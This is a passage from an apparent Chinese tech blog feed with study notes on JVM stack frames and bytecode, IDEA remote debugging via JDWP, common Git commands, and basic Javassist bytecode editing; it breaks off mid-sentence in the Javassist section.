    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>知人者智，自知者明。</p></blockquote><p>最近在看Java污点分析，逃不开<code>对象.方法</code>调用形式，做个记录，随时更新。</p><a id="more"></a><h1 id="温故"><a href="#温故" class="headerlink" title="温故"></a>温故</h1><p>动态语言与静态语言</p><p>对类型的检查，在编译期就是静态语言，在运行期就是动态语言；</p><p>静态语言是判断变量自身的类型信息，动态语言是判断变量值的类型信息</p><p>动态语言中，变量没有类型信息，变量值才有类型信息。</p><p>Java: String info = “atguigu”;//info = atguigu;会报错 类型不匹配</p><p>JS：var name = 123;var name = “sun”;都可以 var就是一个变量的泛化。</p><p>方法调用</p><p>方法的绑定机制：符号引用转换为调用方法</p><p>静态链接：</p><p>当一个字节码装进JVM内部的时候，如果被调用的方法在编译器可知，且运行时保持不变。静态链接</p><p>动态链接：</p><p>当被调用的方法无法在编译期确定下来，只有在程序运行起来，才能确定。动态链接</p><p>动态链接：将符号引用直接变成直接引用</p><p>在.java-&gt;.class过程中，所有的变量和方法引用都会作为符号引用（#5）保存在class文件的常量池中</p><p>比如描述一个方法调用了另外的其他方法，就是通过常量池中指向方法的符号引用来表示的。</p><p>动态链接的用途就是去运行时常量池（在方法区里面）里面把这些符号引用转换为调用方法的直接引用。</p><blockquote><p>重点!!!</p><ol><li>JVM是<strong>基于栈的计算模型</strong></li><li>在解析过程中，每当为Java方法分配栈帧时<ul><li>执行每条执行之前，JVM要求该指令的操作数已被压入操作数栈中</li><li>在执行指令时，JVM会将该指令所需要的操作数<strong>弹出</strong>，并将该指令的结果重新<strong>压入</strong>栈中</li></ul></li></ol></blockquote><h1 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h1><p>栈帧是线程私有的，每一个方法对应一个栈帧。</p><p>四个主要组成成分：操作数栈，局部变量表，动态链接，方法返回地址。（还有一些附加信息，无所谓了）</p><p>重点说两个：局部变量表和操作数栈</p><h2 id="局部变量表"><a href="#局部变量表" class="headerlink" title="局部变量表"></a>局部变量表</h2><p>当一个方法被调用时，会使用局部变量表来存储参数值和方法内部的方法局部变量。</p><p>他是一个数组，用来存放方法参数和定义在方法内部的方法变量。</p><p>可以是引用类型（String等），可以是对象引用，可以是返回地址。</p><p>线程私有数据。</p><p>如果当前方法是对象实例的成员方法（没有被static修饰），那局部变量表[0]存放的是this的引用。</p><p>参数分配完毕后，再根据方法体内部定义的局部变量顺序和作用域分配其余的变量槽。</p><p>这里基本数据类型（double long除外）+ 引用类型（String） 都是一个slot ；long double 都是两个slot</p><h2 id="操作数栈"><a href="#操作数栈" class="headerlink" title="操作数栈"></a>操作数栈</h2><p>也常称为操作栈，它是一个后入先出栈(LIFO)。</p><p>保存程序执行过程中的临时结果，保存中间变量。</p><p>当一个方法刚刚开始执行时，其操作数栈是空的，随着方法执行和字节码指令的执行，会从局部变量表或对象实例的字段中复制常量或变量写入到操作数栈，再随着计算的进行将栈中元素出栈到局部变量表或者返回给方法调用者，也就是出栈/入栈操作。一个完整的方法执行期间往往包含多个这样出栈/入栈的过程。</p><p>如果被调用的方法带有返回值的话，其返回值将会被压入当前栈帧的操作数栈中。</p><h2 id="小例子"><a href="#小例子" class="headerlink" title="小例子"></a>小例子</h2><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317174904301.png" alt="image-20210317174904301"></p><p>Javap -v Demo:</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317175016279.png" alt="image-20210317175016279"></p><p>流程：</p><p>操作数栈长度为2，局部变量表长度为4，参数大小为1 pc寄存器地址值：JVM字节码指令</p><p>bipush 10从常量池里取出10 放到操作数栈顶</p><p>istore_1 将操作数栈中栈顶元素给到局部变量表的1号位置 10（0号位置给了this）</p><p>bipush 20从常量池里取出20 放到操作数栈顶</p><p>istore_2 将操作数栈中栈顶元素给到局部变量表的2号位置  20</p><p>iload1从局部变量表中取出1号元素 10 放到操作数栈栈顶</p><p>Iload2从局部变量表中取出2号元素 20 放到操作数栈栈顶</p><p>iadd 将当前操作数栈的栈顶两个元素求和 结果放在栈顶</p><p>return结束 返回void</p><p>再看一个方法调用的：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203643349.png" alt="image-20210317203643349"></p><p>javap -v Main</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317203803521.png" alt="image-20210317203803521"></p><p>先看创建一个对象：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317205038396.png" alt="image-20210317205038396"></p><ol><li>执行new指令时，JVM将指向一块<strong>已分配的但未初始化</strong>的内存引用压入操作数栈。此时A类在方法区，堆中创建一个A对象的空间，大小可以确定，一些值会进行默认初始化。</li><li>接下来dup就是将操作数栈栈顶的值（对象堆空间的引用值）复制一份，<strong>压入栈顶</strong>。</li><li>invokespecial指令将要以这个引用为调用者，调用其构造器<ul><li>该指令将<strong>消耗掉</strong>操作数栈上的元素，作为它的调用者和参数</li></ul></li><li>因此，在这之前利用dup<strong>指令</strong>复制一份new指令的结果，并用来调用构造器</li></ol><p>这里 invokespecial指令结束之后，返回对象的引用为void，栈中元素只有一个引用（之前复制的那个）</p><p>接着aload_1，将局部变量表里1号位置的元素（参数args）取出，放在栈顶</p><p>接下来invokevitural，调用虚方法method1(args)，这里javap -v A</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317223337010.png" alt="image-20210317223337010" style="zoom:50%;"><p>在method1内部，操作数栈大小为1，局部变量表为2（0号位置本类this）</p><p>首先aload_1将参数args放入操作数栈顶</p><p>接着areturn，将栈顶元素返回，是引用类型（String）</p><p>这时候回到之前main方法的操作数栈，返回的param放在了栈顶。</p><p>接着astore_2将返回值param放在了局部变量表的2号位置</p><p>此时操作数栈为空</p><p>接着继续new出来一个B对象，与上个A对象同理</p><p>依旧还是dup之后invokevirtual调用构造方法</p><p>之后aload_2将局部变量表里面的2号元素（也就是之前的param拿出来，也就是cmd）放到栈顶</p><p>invokevirtual去执行method2（cmd）方法</p><p>javap -v B看一下</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317224622996.png" alt="image-20210317224622996" style="zoom:50%;"><p>在method2里面 实例化了C对象 嵌套起来了</p><p>在method2里面，操作数栈大小为2，局部变量表大小为2</p><p>new-dup-init组合拳生成C对象 接下来调用method3（param）</p><p>javap -v C</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317225028439.png" alt="image-20210317225028439" style="zoom:50%;"><p>直接返回param</p><p>那么对于method3返回的结果，被B的method2进行了<code>11:areturn</code>返回</p><p>返回到哪里 ？ 返回到了调用method2的main方法内部<code>23:areturn</code>地方</p><p>作为main函数的最终结果返回。</p><h1 id="Java创建对象的过程"><a href="#Java创建对象的过程" class="headerlink" title="Java创建对象的过程"></a>Java创建对象的过程</h1><p><a href="https://mp.weixin.qq.com/s/3cm32TzROaQgyKf1TCl0Rg" target="_blank" rel="noopener">这篇</a>讲得非常好，来总结一下3种主流方法。</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Object();</span><br></pre></td></tr></table></figure><p>最常用的创建方式。</p><p>对应字节码：</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210322093031418.png" alt="image-20210322093031418"></p><p>在Java中，认为创建一个对象就是调用其构造方法，对于new Object()方法其实就是调用了Object类的无参构造方法，但是在字节码中，<strong>对象的创建和调用构造方法是分开的</strong>。</p><p>在上图字节码中，</p><p>new指令其实就是在堆中创建一个对象，并把对象的引用压入栈（指代操作数栈，后面同理）中。</p><p>dup指令会复制栈上最后的一个元素，然后将这个复制压入栈顶。为什么会有两个呢？</p><p>是<a href="https://www.zhihu.com/question/52749416" target="_blank" rel="noopener">因为</a>接下来的invokespecial指令会<strong>消耗</strong>掉操作数栈顶部的一个对象引用，作为传递给构造器的<code>this</code>参数，我们希望在invokespecial调用之后，在操作数栈顶还维持一个指向新建对象的引用，那么就得先在invokespecial之前先复制一份引用，也就是dup的原因。</p><h2 id="newInstance方法来创建"><a href="#newInstance方法来创建" class="headerlink" title="newInstance方法来创建"></a>newInstance方法来创建</h2><p>这里，<code>newInstance</code>方法是指<code>Class</code>类中的方法，<code>newInstance</code>方法会调用无参的构造方法创建对象。</p><p>两种模板：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User user = (User)Class.forName(<span class="string">"com.sec.User"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">User user = User<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br></pre></td></tr></table></figure><p><code>ldc</code>指令代表将常量池里的引用推入栈顶</p><p><code>forName</code>是静态方法 需要invokestatic</p><p><code>newInstance</code> 是虚方法，需要invokevirtual</p><h2 id="使用反射API来创建对象"><a href="#使用反射API来创建对象" class="headerlink" title="使用反射API来创建对象"></a>使用反射API来创建对象</h2><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;User&gt; cons = User<span class="class">.<span class="keyword">class</span>.<span class="title">getConstructor</span>()</span>;</span><br><span class="line">User user = cons.newInstance();</span><br></pre></td></tr></table></figure><h1 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h1><p>java中没有被static native修饰的方法就是是虚方法</p><p>感觉invokespecial init是消耗一个对象内存 不会返回任何东西（或者说返回void） </p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231200462.png" alt="image-20210317231200462"></p><p>注意最后这个pop弹栈操作，很关键。</p><p>首先new-dup出现两个ref在栈中 那么invokespecial会消耗一个对象引用 还会剩一个</p><p>最后的pop也就是将最后一个（栈顶）弹出来，操作数栈排空。</p><p>invokestatic 是不消耗任何对象引用，静态方法是不需要对象.的格式去调用，直接类.方法就好了</p><p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317231143953.png" alt="image-20210317231143953"></p><p>invokevirtual是获取通常为this和参数，然后一起进行方法调用。</p><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232352641.png" alt="image-20210317232352641" style="zoom:50%;"><img src="../images/JVM%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8/image-20210317232507679.png" alt="image-20210317232507679" style="zoom:50%;">]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;知人者智，自知者明。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近在看Java污点分析，逃不开&lt;code&gt;对象.方法&lt;/code&gt;调用形式，做个记录，随时更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="JVM" scheme="https://0range228.github.io/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>IDEA远程调试记录</title>
    <link href="https://0range228.github.io/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
    <id>https://0range228.github.io/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</id>
    <published>2021-03-15T06:34:39.000Z</published>
    <updated>2021-03-15T07:20:00.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>天街小雨润如酥，草色遥看近却无。</p></blockquote><p>记录IDEA远程调试过程。随时更新，参考<a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open" target="_blank" rel="noopener">yz</a>。</p><a id="more"></a><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>点击工具栏的<code>Add Configuration...</code>，点击左侧的<code>+</code>号，选择<code>Remote</code>，如下图：</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144011945.png" alt="image-20210315144011945"></p><p>创建之后，复制这段命令，记得要改成<code>suspend=y</code>。</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144220008.png" alt="image-20210315144220008"></p><h1 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h1><h2 id="有源码调试"><a href="#有源码调试" class="headerlink" title="有源码调试"></a>有源码调试</h2><p>这里在IDEA自带的终端里演示（系统shell当然也可以）：</p><p>cd classes:</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144259091.png" alt="image-20210315144259091"></p><p>输入这条命令<code>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 com.sec.Test</code></p><p>注意末尾是你的包名类名，执行后终端会等待debug，这时候下断点可以看到终端里会配合输出。</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315144746757.png" alt="image-20210315144746757"></p><h2 id="无源码-只有jar包"><a href="#无源码-只有jar包" class="headerlink" title="无源码 只有jar包"></a>无源码 只有jar包</h2><p>这种需求更加常见，对于jar包里的代码，下端点调试的想法会更多，记录一下。</p><p>首先，这里我是一个maven项目，<code>mvn clean package</code>即可，当然你直接shell打包也行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">jar -cvf test.jar *</span><br></pre></td></tr></table></figure><p>对于打包好的jar包，可以放在当前的IDEA项目下，右键-&gt;add as library，可以直接反编译源码</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150152050.png" alt="image-20210315150152050"></p><p>打开jar包，在想看的地方下端点</p><p>执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span> -cp Test.jar com.sec.Test</span><br></pre></td></tr></table></figure><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150434825.png" alt="image-20210315150434825"></p><p>点击小甲虫就完事了：</p><p><img src="../images/IDEA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20210315150524937.png" alt="image-20210315150524937"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;天街小雨润如酥，草色遥看近却无。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;记录IDEA远程调试过程。随时更新，参考&lt;a href=&quot;https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925#open&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;yz&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IDE" scheme="https://0range228.github.io/categories/IDE/"/>
    
    
      <category term="IDEA" scheme="https://0range228.github.io/tags/IDEA/"/>
    
  </entry>
  
  <entry>
    <title>Git笔记</title>
    <link href="https://0range228.github.io/Git%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Git%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-05T16:29:37.000Z</published>
    <updated>2021-03-14T07:15:11.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>日长似岁闲方觉，事大如天醉亦休。</p></blockquote><p>整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。</p><a id="more"></a><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>本地 add 暂存区 commit -m 本地仓库 git push 远程仓库</p><p>git add     提交暂存区</p><p>git commit -m “xxx”     提交本地Git仓库</p><p>git pull     检查协同操作是否冲突</p><p>git push   上传远程仓库</p><p>git status  查看本地git任务状态</p><p>git log 查看操作日志</p><h1 id="实战记录"><a href="#实战记录" class="headerlink" title="实战记录"></a>实战记录</h1><h2 id="新建项目关联远程git仓库"><a href="#新建项目关联远程git仓库" class="headerlink" title="新建项目关联远程git仓库"></a>新建项目关联远程git仓库</h2><p>cd</p><p>git init</p><p>git add .</p><p>git commit -m “push “</p><p>git remote add origin GIT_LINK[.git] 关联远程仓库</p><p>git pull –rebase origin master 检查/校验 多人开发 </p><p>git push -u origin master</p><h2 id="更新之后提交至git仓库"><a href="#更新之后提交至git仓库" class="headerlink" title="更新之后提交至git仓库"></a>更新之后提交至git仓库</h2><p>cd</p><p>git add FILENAME</p><p>git commit -m “修改了xxx”</p><p>git pull –rebase origin master</p><p>git push -u origin master</p><h2 id="删除远程中仓库中的文件"><a href="#删除远程中仓库中的文件" class="headerlink" title="删除远程中仓库中的文件"></a>删除远程中仓库中的文件</h2><p>git rm -r -n –cached 文件/文件夹 预览暂存区中要删除哪些文件（只是预览）</p><p>git rm -r –cached 文件/文件夹 直接删除</p><p>git commit -m ‘xxx’</p><p>git push 提交远程仓库</p><p>如果远程+本地+暂存区，一起删除文件：</p><p>git rm file_path<br>git commit -m ‘delete somefile’<br>git push</p><h2 id="IDEA-amp-Github"><a href="#IDEA-amp-Github" class="headerlink" title="IDEA &amp; Github"></a>IDEA &amp; Github</h2><p>git init : VCS -&gt; Import into Version Control -&gt; Create Git Repositry 选择目标项目文件夹</p><p>git add .  : 右键项目 -&gt; Git -&gt; add</p><p>(首次配置，之后不用)</p><p>git remote : 右键项目 -&gt; Git -&gt; Repository -&gt; Remotes </p><p>name：origin</p><p>git：粘贴github仓库地址</p><p>git commit : 右键项目 -&gt;  commit directory -&gt; 在窗口中选择上传文件 上传记录</p><p>git push 右上箭头即可</p><p>不好使可以：</p><p>git pull </p><p>git pull origin master </p><p>git pull origin master –allow-unrelated-histories</p><p>git push -u origin master -f</p><p>对于没有的项目</p><p>可以VCS -&gt; Import into Version Control -&gt;Share Project on Github</p><p>对于git clone下来的项目，如修改之后想再次提交 可以直接右上push 箭头可以直接提交 commit pull push</p><p>红色：未add；<br>绿色：已add、未commit；<br>蓝色：已add、已commit、有改动；<br>灰色：忽略；</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;日长似岁闲方觉，事大如天醉亦休。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Git相关知识 ，以及如何与IDEA梦幻联动。随时更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="基础工具" scheme="https://0range228.github.io/categories/%E5%9F%BA%E7%A1%80%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Git" scheme="https://0range228.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Javassist学习笔记</title>
    <link href="https://0range228.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-02-16T11:13:46.000Z</published>
    <updated>2021-06-03T15:44:16.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>醉里挑灯看剑，梦回吹角连营。</p></blockquote><p>整理Javassist相关知识 。  </p><a id="more"></a><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>比ASM更适合人类操纵字节码，使用API可以实现例如生成类、修改类的操作。</p><p>允许Java程序可以在运行时定义一个新的class、在JVM加载时修改class文件。</p><p>提供了2各层次的API：源码级别、字节码级别。</p><p>如果用户使用了源码级别的API，就可以在不了解Java字节码规范的情况下编辑class文件。整个API是基于Java语言词汇设计的。你甚至可以以源码文本形式指定插入字节码，javassist编译它是非常快的。</p><p>另一方面。字节码层次的API允许用户像其它编辑器一样直接编辑class文件。</p><p><a href="http://www.javassist.org/html/index.html" target="_blank" rel="noopener">API文档</a></p><h2 id="读写字节码"><a href="#读写字节码" class="headerlink" title="读写字节码"></a>读写字节码</h2><p>Javassist是一个处理字节码的类库。Java字节码存储在一个叫做*.class的二进制文件中。每个class文件包含一个Java类或者接口。</p><p><code>javassist.CtClass</code> 代表一个class文件的抽象类表示形式。一个<code>CtClass</code>(compile-time class编译时的类)是一个处理class文件的句柄，以下是一个简单的程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.get(<span class="string">"test.Rectangle"</span>);</span><br><span class="line">cc.setSuperclass(pool.get(<span class="string">"test.Point"</span>));</span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure><p>这段程序首先包含一个<code>ClassPool</code>对象，通过Javassist控制字节码的修改。</p><p><code>ClassPool</code>对象是代表class文件的<code>CtClass</code>对象的容器。它根据构造一个<code>CtClass</code>对象的需求读取一个class文件，并记录被构建好的对象以供将来进行访问。 为了修改一个类的定义，用户必须首先从<code>ClassPool</code>对象的<code>.get(className)</code>方法获取一个<code>CtClass</code>引用。 </p><p>在上述示例中，<code>CtClass</code>对象cc表示<code>ClassPool</code>中的类<code>test.Rectangle</code>，并且将其分配给变量<code>cc</code>。 <code>ClassPool</code>对象由静态方法<code>getDefault</code>方法查找默认的系统检索path返回。格式为“包名.类名”。</p><p>从实现上来看，<code>ClassPool</code>是一个<code>CtClass</code>的哈希表，使用class name作为key。</p><p><code>ClassPool.get()</code>方法通过检索这个哈希表找到一个<code>CtClass</code>对象关联指定的key。</p><p>如果<code>CtClass</code>对象没有找到，<code>get()</code>方法会读取class文件去构造一个<code>CtClass</code>对象，记录在哈希表中然后作为<code>get()</code>的返回值返回。</p><p>从<code>ClassPool</code>中获取到的<code>CtClass</code>对象是可以被修改的。在上述示例中，它被修改了 <code>test.Rectangle</code>的父类变更为<code>test.Point</code>,这个修改将会在最后<code>CtClass.writeFile()</code>方法调用后反映在class文件中。</p><p>javassist提供了写到类文件的方法：</p><p><code>writeFile()</code> 方法将<code>CtClass</code>对象转换到class文件并且将其写入本地磁盘。Javassist也提供了一个方法用于直接获取修改后的字节码：<code>toBytecode()</code>:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte[] </span><span class="keyword">b </span>= cc.toBytecode()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>也可以像这样直接加载<code>CtClass</code>:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Class clazz</span> = cc.toClass();</span><br></pre></td></tr></table></figure><p><code>toClass</code> 请求当前线程的上下文类加载器去加载class文件，返回一个<code>java.lang.Class</code>对象。</p><p>例子：</p><h3 id="定义一个新类"><a href="#定义一个新类" class="headerlink" title="定义一个新类"></a>定义一个新类</h3><p>重新定义一个新的类，<code>ClassPool.makeClass</code>方法将会被调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">System.out.println(cc.toClass()); <span class="comment">// 输出class com.sec.Point</span></span><br></pre></td></tr></table></figure><p>这个程序定义了一个<code>Point</code>类，未包含任何成员，成员方法可以通过使用<code>CtClass</code>的<code>addMethod()</code>方法传入一个<code>CtMethod</code>的factory方法创建的对象作为参数来追加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个新的类</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">"hello.make.Point"</span>);</span><br><span class="line"><span class="comment">//System.out.println(cc2.toClass().getMethods().length); // 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 追加方法</span></span><br><span class="line">cc.addMethod(CtMethod.make(<span class="string">"public void sayHello()&#123;\n"</span> +</span><br><span class="line">        <span class="string">"        System.out.println(\"Hello!\");\n"</span> +</span><br><span class="line">        <span class="string">"    &#125;"</span>,cc));</span><br><span class="line">System.out.println(cc.toClass().getMethods().length);  <span class="comment">// 10</span></span><br></pre></td></tr></table></figure><p><code>makeClass()</code>方法不能创建一个新的接口，需要使用<code>makeInterface()</code>方法才可以创建一个新的接口。 接口中的成员方法可以通过<code>CtMethod</code>的<code>abstractMethod</code>方法创建。   </p><p>以上这个例子会报错：<code>com.sec.Point class is frozen</code></p><h3 id="Frozen冻结类"><a href="#Frozen冻结类" class="headerlink" title="Frozen冻结类"></a>Frozen冻结类</h3><blockquote><p> <strong>冻结类的含义</strong></p><p>如果一个<code>CtClass</code>对象通过<code>writeFile()</code>、<code>toBytecode</code>、<code>toClass()</code>方法被转换到class文件中，Javassist则会冻结这个<code>CtClass</code>对象。再对这个<code>CtClass</code>对象进行操作则是不允许的，当开发者尝试去修改一个已经被JVM加载过的class文件的时候会发出警告，因为JVM不允许重复加载一个class。 </p></blockquote><p>一个冻结的<code>CtClass</code>可以通过其<code>defrost()</code>方法解冻，解冻后可以允许对这个CtClass修改： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被冻结了，不能再修改(Exception in thread "main" java.lang.RuntimeException: com.sec.Point class is frozen)</span></span><br><span class="line"><span class="comment">// 解冻后可以修改</span></span><br><span class="line">cc.toBytecode(); or cc.toClass();<span class="comment">// 被冻结</span></span><br><span class="line">cc.defrost();<span class="comment">// 解冻</span></span><br><span class="line"><span class="comment">//以上两部顺序不能反，都是先解冻再修改。</span></span><br><span class="line">System.out.println(cc.getFields().length);</span><br><span class="line">cc.addField(CtField.make(<span class="string">"private String name;"</span>, cc));<span class="comment">// 解冻后允许修改</span></span><br><span class="line">cc.writeFile();</span><br><span class="line">System.out.println(cc.getFields().length);</span><br></pre></td></tr></table></figure><h3 id="修剪类-prune"><a href="#修剪类-prune" class="headerlink" title="修剪类 prune"></a>修剪类 prune</h3><p>如果ClassPool.doPruning被设置为true，那么当Javassist冻结一个CtClass对象时，Javassist就会对该对象中包含的数据结构进行修剪。为了减少内存消耗，修剪会丢弃该对象中不必要的属性（attribute_info结构）。例如，Code_attribute结构（方法体）会被丢弃。因此，当一个CtClass对象被修剪后，除了方法名、签名和注释外，无法访问方法的字节码。修剪后的CtClass对象不能再被解冻。ClassPool.doPruning 